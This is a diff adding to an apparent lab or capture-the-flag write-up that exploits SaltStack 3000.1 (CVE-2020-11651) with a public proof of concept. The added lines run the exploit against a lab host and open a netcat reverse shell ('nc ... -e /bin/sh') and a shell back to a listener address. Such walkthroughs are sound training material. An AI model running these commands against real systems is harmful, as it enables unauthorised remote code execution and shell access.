@@ -67,3 +67,8 @@ After trying out the admin... nah it aint that easy. So we take a look at port 8
 Apparently we have something good on [exploitDB](https://www.exploit-db.com/exploits/48421) , let's just run Saltstack 3000.1 - Remote Code Execution like some script kiddie, and my guy actually uploaded a [poc](https://github.com/jasperla/CVE-2020-11651-poc) for it... good stuff
 
 
+```
+python3 exploit.py --master 192.168.145.62 --exec "nc 127.0.0.1 4444 -e /bin/sh"
+```
+
+python3 exploit.py --master 192.168.145.62 --port 4506 -lh 192.168.45.197 -lp 1337 --exec-choose master
